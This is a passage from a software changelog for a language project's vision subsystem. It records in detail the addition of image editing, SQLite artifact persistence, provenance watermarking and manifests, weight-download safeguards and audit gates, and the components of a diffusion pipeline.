  became a real in-context editing path (the second third of R6
  "Edit + LoRA," plan section 7.1; R6 was loudly split: #242 = save/load —
  closed, #243 = edit, #244 = LoRA). Contract: arity 2, a typed
  handle (`[Vision#N]`, modeled on export/save); **the source MUST be
  signed** — an artifact with `manifest: None` is a loud Err (specifically
  BEFORE the env check: the contract refusal does not depend on the
  environment; editing an unsigned artifact cannot honestly be done —
  there is nothing to inherit, and producing an unsigned one through the
  real compute path is forbidden by #241 Block 1.3). Unsigned artifacts
  remain usable via `vision_export_raw` — this was NOT changed.
- **The in-context edit compute path (Block 1)**: `VaeEncoder` in
  `src/vision/vae.rs` (mirroring `VaeDecoder`) — loads the non-decoder
  prefixes of the SAME pinned `vae/diffusion_pytorch_model.safetensors`
  (the weights manifest is NOT extended, 16 files / 32,848,304,654 B —
  an invariant). The manifest's arithmetic of 244 = 138 decoder + 106 encoder means
  `quant_conv` is optional: its presence or absence is a loud note,
  and the actual non-decoder list is checked against the file's header at
  the PARKED run (runbook section 3.1), a mismatch against the generator
  `vae_expected_encoder_keys` being a loud Err listing what's missing.
  `encode(img F32 [-1..1]) → [1, C, H/f, W/f]` runs in posterior MODE
  (for determinism), the ritual being the algebraic inverse of #232's
  decoder direction (`z_model = (mean − shift) · scaling`); `decode_png` is
  the decoding half of `encode_png`. The cycle: `flow_match_euler_edit`
  (`sampler.rs`) plus `forward_edit` (`dit.rs`, additive — generate is
  untouched): the reference latent is concatenated as tokens with the noisy
  one at EVERY step (the same `x_embedder` plus `noise_refiner`; the
  reference's RoPE t-slot is cap_len+2 while the noise's is cap_len+1 —
  a loud check against `axes_lens`), `euler_step` applies only to the noise
  branch, the reference stays clean; **`EDIT_STEPS = 8`** — the distilled
  turbo NFE (a loud constant with a pinning test); there is no CFG (turbo).
  **The wedge goldens of #212 stay bit-exact with NO edits** (85ef6a87/860c85b3) —
  adding the edit path does not change generate by a single bit (Block 1.3).
- **Provenance inheritance (Block 2.3, always sign)**: an edited
  artifact is always signed — an LSB watermark (the source's model_id) plus 7 fields:
  `model_id`/`policy`/`seed` are inherited from the source's manifest
  (determinism: the same source plus prompt plus weights gives the same seed), `model_sha256` is
  the current run's `weights_tree_sha256`, `prompt_sha256` is the hash of the
  EDIT prompt, `timestamp`/`png_sha256` are fresh (the SHA is computed after the
  watermark — it describes exactly the bytes that are shipped).
- **The dims contract (Block 1.4)**: the R4.1 bounds on the source (256..=4096, x16)
  and being a multiple of the VAE factor are loud Errs; silent resizing is forbidden (it would
  corrupt the provenance chain): the output keeps the source's resolution.
- **Taint (Block 3)**: the positional check on arg 1 is extended to `vision_edit` —
  the same check-id `VISION_PROMPT_USER_INPUT` (Warning, arg 0's handle is not
  flagged); there are no new check-ids/categories, and #241's gates are untouched.
- **Intercepts plus truth-up (Block 2.5/2.6)**: the interpreter (eval + invoke) and
  the VM — the state-carrying pattern from #240-#242; the last-resort stub is
  modeled on #242's save/load stubs; the doc reference "214/215" is replaced by
  "R6.2, #243" — the last "214/215" left the repo.
  `tests/naryad_210_vision_skeleton.rs`: the stub test is replaced by
  real-path refusals (a typed handle plus arity) — 10 → 11 tests.
- **Tests (Block 4, no network/weights, no `#[ignore]`)**: 14 tiny contracts
  in `tests/naryad_243_vision_edit.rs` (modeled on the #212 wedge: the output's
  dependence on the source and on the edit prompt, the watermark plus the
  inheritance of 7 fields, an unsigned refusal, the R4.1/factor dims contract,
  a no-env refusal, the EDIT_STEPS pin, forward_edit's shape contract,
  determinism of the cycle) plus an env-gated
  `mlog_vision_edit_export_e2e` (a loud SKIP; generate → edit → export:
  preserving dims, the sidecar's inheritance, the watermark) — the edit e2e
  target lives in runbook section 3.1. The registry stays at 389; `KNOWN_VISION_MODELS`/the
  ADR-0124 enum/weights.rs/grammar.pest/the golden constants/LoRA/#241's gates are
  untouched; a dedicated env-gated CI step was NOT added (owner debt, a
  4th round of the reminder).


### Added — Vision R6.1: SQLite persistence of artifacts (Naryad #242)

- **`vision_save(handle, name) -> String` / `vision_load(name) -> Vision`
  (Block 2)**: the loud R1 stubs (`src/builtins/vision.rs:723/733`) became
  real persistence paths. Intercepted in the interpreter (eval + invoke) and
  the VM — the state-carrying pattern from #240/#241 plus a connection to the
  program's DB (`db_conn`: on the VM, a field from `program.db_url`; on the
  interpreter, an `Arc<Mutex<Option>>` from the `db { url: "sqlite:..." }`
  declaration). The registry id is a session-scoped handle (monotonic from
  zero, NOT persisted); the persistent key is `name`. No-db gives a loud Err
  with a hint at the declaration; an unknown handle gives a loud Err with
  `[Vision#N]`; an unknown name gives a loud Err with a list of what's saved
  (loud diagnostics).
- **A new module, `src/vision/store.rs` (Block 1)**: the
  `vision_artifacts` table (name TEXT PRIMARY KEY, png_bytes BLOB NOT NULL,
  manifest_json TEXT, saved_at TEXT NOT NULL RFC 3339 UTC; creation is
  modeled on `init_kv_persist`, WAL is left untouched — it's managed by the
  db layer). The `save`/`load`/`list` API is for tests and loud diagnostics;
  there is no built-in listing layer on top of the DB. **A verbatim
  manifest round trip**: `Some(m)` → sidecar JSON → `Some(m')`, `m' == m`
  field by field (including `timestamp` — provenance persistence does not
  regenerate it); `None` → `NULL` → `None`; **malformed manifest JSON is a
  loud Err** (silent degradation to unsigned would be a forbidden loss of
  provenance). **A name collision is a loud Err** (a plain INSERT — upsert/delete
  semantics are out of scope for #242, since a silent overwrite would break
  the provenance chain); an empty name is a loud Err; the PNG bytes only ever
  travel as a BLOB in the program's DB (no on-disk writes outside the export
  path).
- **The round-trip contract (Block 3, R6's planned "round-trip test"
  acceptance)**: registry A with a signed artifact → save → a new, empty
  registry B → load → a signed `vision_export` — the PNG and the sidecar
  `<path>.manifest.json` are byte-for-byte equal to the originals. **The #241
  backstop stays alive after persistence**: a loaded artifact with
  `manifest: None` is still refused by a signed `vision_export`
  (`VISION_UNSIGNED_EXPORT`) and works with `vision_export_raw` without a
  sidecar. Tests: 8 unit tests (store) plus 8 integration tests
  (naryad_242_vision_save_load); no network, no weights, no
  `#[serial]` (the env is untouched), `sqlite::memory:` per test.
- **The registry stays at 389**: the `vision_save`/`vision_load` stubs
  have existed in the registry since #210 — the naryad replaced their
  bodies/intercepts, without adding builtins. The last-resort stubs were
  updated loudly (modeled on `vision_export_raw_stub`, using the #242
  numbering instead of the outdated "214/215" R0-era one). `vision_edit`
  remains a loud R6 stub (its turn is #243).

### Added — Vision R5: Security — Category A gates + a Provenance MVP (Naryad #241, ADR-0125)

- **A Provenance MVP (Block 1)**: `vision_generate` ALWAYS signs — an
  LSB watermark is embedded in the PNG (the payload is the `"MLGV"` magic
  bytes plus a model-hash32 = the first 4 bytes of SHA-256(model_id), 64
  bits in the RGB channels' LSBs; force-set is idempotent; detection reads the
  decoded pixels; a signing failure is a loud `Err` BEFORE the artifact
  reaches the registry), and the artifact carries a `VisionManifest`
  (the model id plus the model's SHA-256 — a fingerprint of the weights
  tree from a pinned `manifest.json`, with an honest `"unpinned"` marker
  when it's absent; the seed; the prompt hash; the policy/`"unspecified"`;
  an RFC 3339 timestamp; the final PNG's SHA-256 — computed after the
  watermark). `vision_export` is now a signed export: PNG plus a sidecar
  `<path>.manifest.json`; #240's unsigned WARN is lifted (export is signed
  by construction). A new module, `src/vision/provenance.rs` — the
  manifest+hash layer is not feature-gated, the watermark is gated behind
  `vision` (it needs a PNG codec). An honest boundary (ADR-0125): the MVP
  watermark is detectable by us, but is NOT adversarially robust
  (robust watermarking/C2PA are a research backlog, not a promise).
- **`vision_export_raw` (Block 2.1, registry 387→388)**: an explicit
  opt-out per ADR-0125 — raw bytes with no watermark/manifest, no sidecar
  written. Intercepted in the interpreter (eval + invoke) and the VM — the
  same state-carrying pattern as `vision_export`.
- **The `VISION_UNSIGNED_EXPORT` gate (Block 2.2 — Category A, an audit
  Error)**: calling `vision_export` in a file with not a single `vision { }`
  declaration — a manifest source is impossible, the artifact cannot be
  signed by construction (modeled on SECRET_LEAK; runs via
  `audit_category_a` → a compile error). A runtime backstop: exporting an
  artifact with no manifest (a hand-built registry) is a loud `Err` with the
  same check-id. **`VISION_UNSIGNED_EXPORT_RAW` (Block 2.3 — an audit
  Warning, advisory)**: fires on every `vision_export_raw` call; the check-id's
  name is fixed by this release (the ADR does not set it). The warning is
  deliberately NOT in the compile path: semantic naryad #98 promotes every
  Warning from `audit_category_a` to an error — that would contradict
  ADR-0125's advisory semantics.
- **The `VISION_POLICY_MISSING` gate (Block 3.1 — an audit Warning) plus
  a parser relaxation ONLY for policy (LOUDLY: the R4.1 contract changes
  per ADR-0125's SSOT, adopted BEFORE R4.1)**: `policy:` is no longer
  required — a missing one parses as `None` (the "field required" error for
  policy is gone), audit warns with `VISION_POLICY_MISSING`, and the
  manifest records `"policy": "unspecified"`; a present value is still
  loudly enum-checked (only `safe`). The other 6 fields remain required;
  the other R4.1 negatives (duplicates, unknowns, the enum, the remaining
  required fields) are untouched. Note: the negative test "missing policy
  → parse error" from R4.1 did not exist in the codebase (#238's 6 parser
  tests did not include it) — the new contract is closed by new tests
  (`test_parse_vision_missing_policy_parses_as_none`,
  `test_parse_vision_unknown_policy_value_still_loud`).
- **The `MODEL_WEIGHTS_UNSAFE` gate (Block 3.2 — Category A, an audit
  Error) plus `vision_fetch_weights(manifest_url, dest_dir)` (registry
  388→389, a real handler)**: an SSRF guard via `check_url_ssrf` (modeled
  on #130, pinning resolutions against DNS rebinding, the kill switch is not
  weakened); an allowlist via the env var `MLOG_VISION_WEIGHTS_ALLOWLIST` —
  **default-deny**: empty/unset means a loud refusal, downloading is
  forbidden; only `manifest.json`-class URLs (a bare `.safetensors` has
  "no pin" — refused; the pickle-RCE class is refused by extension); SHA-256
  pinning of every manifest entry (reusing `WeightsManifest`, `src/vision/weights.rs`
  is not rewritten) — a mismatch is a loud refusal, the file is NOT written;
  entry names are bare `.safetensors` only (no paths/traversal). The static
  gate catches statically visible violations: a literal URL of the
  SSRF-blocked class, a literal `.safetensors`/pickle-class, a literal
  manifest-class URL is statically valid (the actual allowlist is a runtime
  env, unreadable statically — both layers are kept, and the exact names
  are documented in PR #239). The gate is written reusably in `audit.rs` —
  a shared SSOT for the future Voice gates (ADR-0125).
- **4 Category A contract tests closed (Block 4)**: 3 new tests in
  `tests/naryad_241_vision_gates.rs` (exact check-ids plus severities;
  negatives — allowlist default-deny, a host outside the allowlist, an
  empty allowlist, a SHA mismatch on synthetic bytes, the raw warning being
  advisory, positive controls) plus #240's taint test
  `user_input_prompt_emits_audit_warning`. Watermark round trip plus
  manifest presence are unit tests in `provenance.rs` (the vision-tests
  job). No network in the tests, no weights needed.
- **Test infrastructure**: `tests/registry_arity_check.rs` gains a full
  vision section (generate/edit/export/export_raw/fetch_weights/save/load —
  the vision lines were previously absent from the exhaustive list); test
  #210's `vision_export_wrong_handle_type_loud_error` now has a
  `vision { }` declaration in its source (the Category A gate would
  otherwise reject the program at compile time; the test's actual subject —
  a runtime refusal — remains reachable; the adaptation is loud).
- README numbers synced with the artifacts: builtins 387→389; the new
  gates are listed under Category A.

### Added — Vision R4.2: dispatch — `vision { }` -> VM -> builtins + taint (Naryad #240)

- **dispatch pipeline (modeled on reflex_decls)**: `Program::vision_decls: Vec<CompiledVisionDecl>`
  (`#[serde(default)]`, fields 1:1 with AST R4.1: name/model/steps/width/height/seed/policy/profile;
  serde-serializable `CompiledVisionPolicy`/`CompiledVisionProfile` enums; single conversion point
  `CompiledVisionDecl::from_ast`). Compiler pass1 populates the vec; pass2 emits no bytecode
  (reflex precedent). `Vm::load_program` registers name → parameters; the interpreter's
  declaration pass does the same from AST. `vision_registry: SharedVisionRegistry` (Mutex) on the
  interpreter, plain `VisionRegistry` on the single-threaded VM.
- **VisionRegistry real artifact type (№240)**: R1's `()` placeholder → `VisionArtifact`
  (encoded PNG bytes, produced by the real pipeline). `insert/get/remove/list_ids` API preserved
  in spirit; IDs remain monotonically increasing.
- **`vision_generate("decl_name", "prompt")` — REAL path (§3.5: zero silent stubs)**:
  declaration resolution (unknown name → loud `Err` with the declared-names list), runtime
  re-check `model ∈ KNOWN_VISION_MODELS` (defense-in-depth for hand-built/deserialized
  `Program`s), weights from `MLOG_VISION_WEIGHTS_DIR` (missing env/component → loud `Err`
  naming the env var and the missing component — honest environment refusal, NOT a stub),
  full clip tokenizer → Qwen3-4B text encoder → Z-Image DiT + `flow_match_euler_sample`
  (steps and seed from the declaration; sampler sigmas = steps + 1) → VAE decode → PNG encode
  → artifact in the registry → `Value::Vision(id)`. The R4.2 z-image-turbo pipeline generates
  a fixed 1024×1024 (sampler derives the latent from the DiT config); other sizes = loud `Err`
  (size parameterization is R5 manifest territory).
- **`vision_list()`** — real registry handles, sorted by id (determinism), `[Vision#N]` display
  form. **`vision_export(handle, path)`** — writes the artifact's real PNG bytes; every export
  is unsigned → loud stderr WARN + static audit-warning (watermark/manifest/Category-A gate = R5).
  **`vision_edit`/`vision_save`/`vision_load` remain loud stubs** (R6: edit + LoRA/SQLite).
- **Arity truth-up (№240, lesson from #234 — the conflict was resolved before writing this up)**: `BUILTIN_REGISTRY`
  `vision_generate` arity **3→2** per the R4 contract (plan §3: `vision_generate("poster", "…")`;
  the R1 stub doc "(model_name, prompt, seed)" predates the declaration language and was never
  the contract). Total builtin count unchanged (387 — no new builtins).
- **Taint integration (plan §4, modeled on n201)**: `UserInput`-tainted expression in position 2 of
  `vision_generate` → audit-**warning** `VISION_PROMPT_USER_INPUT` (NOT Category A — a
  user-typed prompt is a legitimate use case; the prompt will be recorded in the generation
  manifest, R5). Arg 0 (declaration name) is not data — not flagged. No taint on
  `Value::Vision` (opaque handle; print-guard already stands).
- **Dispatch intercepts (modeled on reflex)**: interpreter (expression evaluation + flow-step
  `invoke`) and VM (`call_vision_builtin` before the generic fallback) route to the shared
  dispatch functions in `src/builtins/vision.rs` — inference logic is NOT reimplemented per
  backend. Registry stubs remain the last resort for direct registry calls (loud refusal).
- **Tests**: `tests/naryad_240_vision_dispatch.rs` (13, non-gated): plan-§3 example parse+compile
  with 1:1 field check; declaration emits no bytecode; dispatch negatives with exact loud
  messages (unknown declaration, wrong arity, missing `MLOG_VISION_WEIGHTS_DIR`, runtime model
  re-check); `vision_list` empty/after-insert sorted; taint warning + three negatives (literal
  prompt, arg-0 taint, sanitized prompt). `tests/naryad_240_vision_mlog_e2e.rs` — env-gated
  `.mlog` e2e (declaration → generate → export → PNG on disk, SHA-256 in output) WITHOUT
  `#[ignore]` — loud-SKIP pattern; **closes the №237 Block 3.1 promise "+ one generation from .mlog"** (loud-gap note in the runbook §3). CI: new `vision-tests` step for the e2e.

### Added — Vision R4.1: `vision { }` declarations — grammar, AST, parser, semantic (Naryad #238)

- **grammar.pest**: `vision_decl` registered in the top-level `declaration`
  rule. `vision "name" { … }` — the name is a STRING (plan-pillar §3 example).
  Seven named fields: `model` (STRING), `steps`/`width`/`height`/`seed` (INT),
  `policy`/`profile` (enum-valued). Unknown field shapes are captured loudly
  by `vision_unknown_field` — named errors with position, no silent skipping.
  `vision_ident_val` (IDENT extended with '-') exists so ADR-0124's `gguf-q4`
  parses — the ADR enum is the SSOT, the token rule bends to fit it.
- **ast.rs**: `Declaration::Vision(VisionDecl)` + `VisionPolicy { Safe }` +
  `VisionProfile { Fp16, Fp8, GgufQ4 }` (ADR-0124 SSOT). `kind_str() => "vision"`,
  name accessor, type_info, span — mirroring neighboring declarations.
- **parser**: duplicate field inside the block = loud parse error pointing at
  the second occurrence; unknown field = loud error naming the field; a known
  field with a wrong value shape gets its own message; policy/profile values
  outside the enums = parse-stage errors (ADR-0124: fp16 | fp8 | gguf-q4;
  R4.1 policy = safe). All seven fields required — no silent defaults.
- **semantic**: `model` must be in the SSOT list `KNOWN_VISION_MODELS`
  (`src/vision/mod.rs`, NOT feature-gated, next to `VisionRegistry`;
  R4.1 = exactly `["z-image-turbo"]`); `steps >= 1` (`steps != 8` →
  audit-warning, NOT error — 8 is the recommended distilled-NFE);
  width/height multiples of 16 in 256..=4096 (VAE latent constraint);
  duplicate vision declaration name in a module = error. All errors carry
  the declaration span and name the field.
- **Tests** (parser + semantic): plan-§3 example parses field-by-field;
  vision + `flow main` parse together; all three ADR-0124 profile values
  parse; 7 negatives (unknown model / unknown profile / unknown field /
  duplicate name / width %16 / steps 0 / duplicate field) — each loud with
  position; valid program = no errors and no warnings; steps != 8 = warning
  (not error).
- **Dispatch NOT touched (R4.2)**: builtins/registry arity and VM are
  zero-diff; vision declarations carry no bytecode and no runtime semantics
  yet. Minimal no-op match arms were added in compiler.rs / execution.rs /
  modules.rs — forced by exhaustive matches (compile requirement),
  documented in naryad #238's PR description.

### Added — Vision R3.7: real-weights run preparation (Naryad #237)

- **fetch tool**: `tools/fetch_vision_weights.sh` — manifest-driven weight
  fetcher (SSOT = №212 manifest tables): `curl -L -C -` per-file resume,
  reference sha = manifest value → else HF LFS oid, sha-verified loud SKIP on
  re-run, POST-DOWNLOAD REFUSAL on mismatch (file not consumed), loud
  non-zero exit on network failure, `--dry-run` offline plan, `--only
  <subdir>` component-scoped fetch. Verified without heavy weights:
  `bash -n`; dry-run plan (16 files); `--only tokenizer` real fetch (4 files,
  15881072 B) + SKIP re-run + truncated-file resume-repair +
  same-size-corruption loud refusal.
- **manifest №212**: section "How to verify against the source" — HF LFS oid = SHA-256 of the file, mismatch = loud refusal;
  layout sizes truth-up from HF models API (real total 32 848 304 654 B ≈
  32.85 GB — the "~24.6 GB" go-no-go estimate was an underestimate);
  tokenizer table filled with real sha256/bytes (download run + SKIP re-run,
  identical values). Heavy weights remain _TODO_ — Branch (b) of Block 2.2
  (no ≥40 GB machine in the delivery environment, 9.2 GB free); loud gap in
  the PR description.
- **runbook**: `docs/research/naryad-237-real-weights-runbook.md` — pre-run
  checklist (≥40 GB disk; ≥64 GB RAM per F32 dtype policy ~62 GB peak; BF16
  honestly flagged R4+ territory), exact env-gated commands (the three №212
  tests), result-fixation table (PNG path/SHA/size, stage timings, 2-run
  bit-exact determinism), Go/No-Go criteria verbatim from go-no-go,
  REAL-RUN-only rule for "REQUIRES REAL RUN" slots.
- **Ignore-count invariant truth-up (Block 2.3)**: the "96/0" figure in older
  naryad templates is not reproducible. Formula fixed from №237 on:
  `git grep -c '#\[ignore' HEAD -- src tests` = N (write the actual N; = 129
  at base 1f26f41/396b1df — 125 tests + 4 src), delta to base = 0.
- **No src changes by design**: scope-freeze — code is GO-ready after №236;
  `git diff --stat <base>..HEAD -- src/` is empty for this naryad. The
  real-weights run is PARKED (owner decision 2026-09-09) until hardware
  appears; the run itself = one session per the runbook, reported separately
  (§3.5 of the naryad spec).

### Added — Vision R3: end-to-end Z-Image-Turbo wedge (Naryad #212, completed #231, rebuilt to reference #232, fix-forward #233, micro-fix #234, VAE structure truth-up #235, expected-key generators extracted #236)

- **VAE structure truth-up (№235)**: decoder structure per real safetensors header —
  layers_per_block+1 resnets per ALL blocks (was: only last), conv_norm_out (GroupNorm→SiLU→conv_out)
  added to decode path, shortcuts on channel changes. VAE tiny golden re-pinned.
- **Expected-key generators extracted (№236)**: VAE/DiT/TE expected-key generators
  extracted to standalone functions (vae_expected_decoder_keys, zimage_expected_keys,
  te_expected_keys). from_weights calls these functions; unit tests call the SAME
  functions (not algorithm copies). Fixed VAE generator bug: in_ch updated inside
  resnet loop (was outside → 146 instead of 138). VAE/DiT/TE goldens unchanged.
- **VAE mid-attn placement fixed (№234)**: attention now applied between
  resnets[0] and resnets[1] per `UNetMidBlock2D.forward` (diffusers
  unet_2d_blocks.py L737-748). Was after both resnets — mathematically wrong.
- **Guard truth-up (№234)**: `check_tensor_coverage` upgraded from count-based
  to key-level (Vec<String>) in all three `from_weights` (DiT, VAE, TE).
  Errors now name the specific missing/extra tensor keys. New unit test
  `loader_guard_tiny_map_coverage` verifies tiny DiT key set.
- **Doc-sync (№234)**: README badge 12→15 blocking jobs; version v0.17→v0.19;
  REFERENCE size ~86→~88 KB; stale v0.18→v0.19 reference.
- **RoPE wire-in (№233)**: `AxialRoPE::apply(q, k)` now called in all attention
  paths (noise_refiner, context_refiner, layers) after qk-norm — was a TODO
  stub. Clamp on out-of-range pos_ids replaced with loud `bail!`. Cap pos_ids
  corrected to per-token `(i+1, 0, 0)` per `create_coordinate_grid` source.
- **Loader tensor-coverage guard wired (№233)**: `check_tensor_coverage` called
  in `ZImageTransformer::from_weights` (expected 521), `VaeDecoder::from_weights`
  (expected 138 decoder), `TextEncoder::from_weights` (expected 398). Detects
  missing/extra tensors at load time.
- **VAE mid-block attention (№233)**: `VaeAttention` struct with GroupNorm →
  spatial self-attention (q/k/v/out_proj) → residual. Loaded from
  `decoder.mid_block.attentions.0.*` in `from_weights`; computed in `decode`
  when `mid_block_add_attention=true`. Tiny config (false) unaffected.
- **DiT rebuilt to diffusers reference (№232)**: 12 discrepancies fixed against
  `transformer_z_image.py` (fetched 2026-09-08):
  - t-embedder: sinusoidal(256) → Linear(256→1024) → SiLU → Linear(1024→min(dim,256))
  - Block adaLN: Linear(min(dim,256)→4*dim), 4 chunks (scale_msa, gate_msa, scale_mlp,
    gate_mlp), gate=tanh(gate), scale=1+scale, NO shift
  - Block norms: 4 RMSNorms (attention_norm1 on input*scale_msa, attention_norm2 on
    attn output before residual, ffn_norm1 on input*scale_mlp, ffn_norm2 on FFN output
    before residual)
  - Final layer: LayerNorm(dim, affine=False, eps=1e-6) → ×(1+scale) → Linear. No gate,
    no shift, no residual. SiLU applied to adaln_input BEFORE Linear (Sequential(SiLU, Linear))
  - cap_embedder: RMSNorm(cap_feat_dim) → Linear(cap_feat_dim→dim). No SiLU.
  - Refiners BEFORE main: noise_refiner (modulation=True) on x-tokens, context_refiner
    (modulation=False) on cap-tokens, THEN main layers
  - Unified sequence: [x, cap] (x first, basic mode)
  - FeedForward: hidden_dim = int(dim/3*8) = 10240 (real) / 170 (tiny)
  - VAE decode ritual: latent / scaling + shift (NOT (latent-shift)/scaling) — pipeline_z_image.py L589
  - Loader guard: `check_tensor_coverage(expected, loaded)` — detects missing/extra tensors
- **DiT tiny golden pinned (№231)**: SHA-256 + anchor bits, pinning ×3, seed
  determinism. Hash `e686167b2e82ee7be9fe3408ed9e619953e774d49e224310f2d0541af3c10257`.
  Fixed n212 forward-path bugs (linear_seeded arg order, broadcasting, refiner
  adaLN, final layer gate/residual) discovered when replacing the
  `assert!(true)` placeholder.

- **Weights infrastructure** (`src/vision/weights.rs`):
  - `WeightsManifest` — record of expected files + SHA-256 (loaded from
    `{weights_dir}/manifest.json` if present; template at
    `docs/research/naryad-212-weights-manifest.md`).
  - `load_safetensors_sharded(dir, stem, device)` — reads `{stem}.safetensors.index.json`,
    loads shards via `candle_core::safetensors`. SHA-256 verification of each
    shard against manifest (loud error on mismatch — silent fallback forbidden).
  - `load_safetensors_single(dir, stem, device)` — for unsharded checkpoints (VAE).
  - ZERO network access (auto-download is R5/ADR-0125).
- **Tokenizer** (`src/vision/tokenizer.rs`):
  - `Tokenizer::from_dir(tokenizer_dir)` — loads HF `tokenizer.json` via the
    canonical `tokenizers` crate. Hand-rolling Qwen2 byte-level BPE with GPT-2
    pre-tokenizer + 119 special tokens is high-risk for silent mis-tokenization;
    `tokenizers` is HF's verified reference (see ADR-0124 update).
  - `encode(text)` — no chat template applied (per diffusers ZImagePipeline).
- **TextEncoder::from_weights** (`src/vision/text_encoder.rs`):
  - New constructor parallel to existing `new(config, seed)`. Loads from
    `HashMap<String, Tensor>` with HF Qwen3 naming. All tensors cast to F32;
    shape-checked against `QWEN3_4B_CONFIG`. R2 contract UNTOUCHED.
- **VAE decoder** (`src/vision/vae.rs`):
  - `VaeDecoder::new_tiny` — seeded tiny-init via SSOT PRNG. Pinned golden
    SHA-256 + 4 anchor bits (3 bit-identical runs).
  - `VaeDecoder::from_weights` — real flux-dev-style AutoencoderKL weights loader.
  - `decode(latent)` — flux-dev ritual `z = (latent - shift) / scaling` then
    decoder then `(sample/2 + 0.5).clamp(0, 1)`. Returns `[3, H, W]` in [0,1].
  - `save_png(img, path)` — PNG encode via `image` crate.
  - `fixed_latent(seed, c, h, w)` — seeded randn via Box-Muller over SSOT-PRNG.
- **ZImageTransformer** (`src/vision/dit.rs`):
  - `ZImageTransformer::new_tiny` — seeded tiny-init via SSOT PRNG.
  - `ZImageTransformer::from_weights` — real DiT loader (cap_embedder, t_embedder,
    30 layers, 2 refiner blocks, final layer with adaLN).
  - `forward(latent, cap, t)` — patchify 2×2 → cap_embed → concat → 30 layers
    (MHA + qk_norm + SwiGLU + adaLN) → split → refiner → final adaLN + unpatchify.
  - Architecture follows diffusers `ZImageTransformer2DModel` (verified by direct
    HF config fetch in Block 0).
- **FlowMatchEuler sampler** (`src/vision/sampler.rs`):
  - `flow_match_euler_sigmas(N, shift, num_train)` — sigma schedule per
    diffusers `FlowMatchEulerDiscreteScheduler`.
  - `euler_step(x, velocity, sigma, sigma_next)` — `x += (sigma_next - sigma) * v`.
  - `flow_match_euler_sample(dit, cap, seed, 9, 0.0)` — full sampling loop.
- **Two-tier test architecture** (`tests/naryad_212_wedge_e2e.rs`):
  - CI-visible (5 tests, no env-gate): VAE tiny golden (pinned), VAE determinism,
    DiT placeholder, sampler sigmas pinned + 4 scheduler unit tests in `sampler.rs`.
  - env-gated (3 tests, loud SKIP when `MLOG_VISION_WEIGHTS_DIR` unset — NOT
    `#[ignore]`): TextEncoder real-weights forward, VAE real-weights decode,
    clinical e2e first image.
- **Dependencies** (gated under `vision`, NOT in default/full):
  - `tokenizers` = 0.22 (HF canonical BPE)
  - `image` = 0.25 with `png` feature only
  - Both added to `vision = ["candle", "dep:tokenizers", "dep:image"]`.
- **Research docs**:
  - `docs/research/naryad-212-wedge-e2e-facts.md` — 13-section fact sheet:
    configs, tensor map (521 transformer tensors + 398 text encoder tensors),
    dtype policy, mechanics (axial RoPE, t-embed, cap-embed, adaLN, refiner),
    R2 contract invariant.
  - `docs/research/naryad-212-weights-manifest.md` — template manifest for
    SHA-256 verification (executor fills at download time).
  - `docs/research/naryad-212-go-no-go.md` — Go/No-Go report (code-complete,
    env-gated run pending real-weights execution on appropriate hardware).

### Fixed — fix-forward #237: runbook doc figures not reconciled with test constants (#238 Block 0)

- `docs/research/naryad-237-real-weights-runbook.md` sections 3 and 6: the DiT tiny golden
  `e686167b…` (a stale n231 hash) → the current `860c85b311905f6c23b90a4e9e3192928027a24bf3e4a00a08096336abad4b3c`
  (SSOT = the `GOLDEN_DIT_TINY_HASH` constant in `tests/naryad_212_wedge_e2e.rs`);
  `e686167b` is kept alongside it as n231's historical hash (the pre-rebuild architecture).
- Also in section 3: the TE size "3 shards, ~7.5 GB" → "3 shards, 8,044,982,000 B ≈ 8.05 GB"
  (3,957,900,840 + 3,987,450,520 + 99,630,640; reconciled by the verifier against the HF API on 2026-09-09).

### Fixed — Vision R2 hotfix (Naryad #230): PRNG SSOT + stream hygiene + golden pinning

- **PRNG SSOT**: the divergent local `generate_uniform_f32` copy in
  `src/vision/text_encoder.rs` (an xorshift64 core without the `seed_to_state`
  XOR ritual, an f32-vs-f64 mapping path that produced divergent value streams from
  the `src/nn` SSOT) is removed. The text encoder now imports
  `crate::nn::attention::generate_uniform_f32` — the project's SSOT for
  weight-init PRNG (documented in `src/nn/attention.rs`).
- **Stream hygiene**: `param_seed(master, layer, param)` — a splitmix64
  finalizer over `(master_seed, layer, param)` — derives per-parameter
  seeds, eliminating naryad #211's stream-overlap bug (layer i's k was
  identical to layer i+1's q; the embedding was identical to layer 0's q).
  The `PARAM_*` constants are fixed (`PARAM_EMBEDDING=0` through `PARAM_DOWN=7`) —
  do NOT renumber them: the derivation is part of the golden contract.
- **Feature implication corrected**: the `vision` feature in `Cargo.toml`
  changed from `["dep:candle-core", "dep:candle-nn"]` (parallel —
  it enabled the dependencies but NOT the `candle` feature flag, so
  `#[cfg(feature = "candle")]` modules in `src/nn/` were not compiled
  under `--features vision`) to `vision = ["candle"]`. This makes
  vision actually imply candle (as the comments throughout the codebase
  already claimed), so `crate::nn::attention` is now accessible from
  vision-only builds. The local copy was the workaround; the implication
  is the fix.
- **The golden contract is pinned**: `tests/naryad_211_text_encoder_golden.rs`
  gains `GOLDEN_HASH_P1/P2/P3` (SHA-256 of the F32 bytes) and
  `GOLDEN_ANCHOR_BITS_P1/P2/P3` (4 corner `f32::to_bits()` values per prompt,
  integer-exact — immune to float-printing drift). Test 1 asserts
  against these. Pinned after 3 bit-identical local runs (2026-09-08).
  The known-debt comments were removed — replaced by "PRNG: SSOT via crate::nn;
  golden records pinned".
- **A derivation test**: a new test, `param_seed_derivation_is_pairwise_distinct`
  — verifies that 32 seeds (4 layers x 8 params) are pairwise distinct plus
  `param_seed(20711, 0, 1) != 20711` (non-identity).
- **CI**: the vision-tests job's "Vision R2 text encoder golden contract"
  step gains `--nocapture` so the eprintln hash/anchor output is visible
  in CI logs — mandatory infrastructure for the re-pinning procedure
  that will recur in R3 (dtype/init changes).


### Added — Vision R2: text encoder (Naryad #211)

- **`vision` feature now implies `candle`** — see hotfix (naryad №230)
  above; the original №211 delivery documented the implication but
  implemented it as parallel `dep:candle-*` enablement without the
  `candle` feature flag.
- **Qwen3-architecture text encoder** (`src/vision/text_encoder.rs`):
  - `TextEncoderConfig` + `QWEN3_4B_CONFIG` (pinned from config.json: 36
    layers, 2560 hidden, 32/8 GQA, head_dim=128, intermediate 9728, SwiGLU,
    RmsNorm eps=1e-6, RoPE theta=1e6, max_position 40960 — corrected
    fix-forward after the initial delivery pinned fabricated dims).
  - `TextEncoder::new(config, seed)` — deterministic seeded init via
    `crate::nn::attention::generate_uniform_f32` (SSOT, naryad №230).
  - `forward(token_ids) -> [seq_len, hidden]` — final-layer hidden states,
    with causal mask, RoPE, QK-norm, GQA.
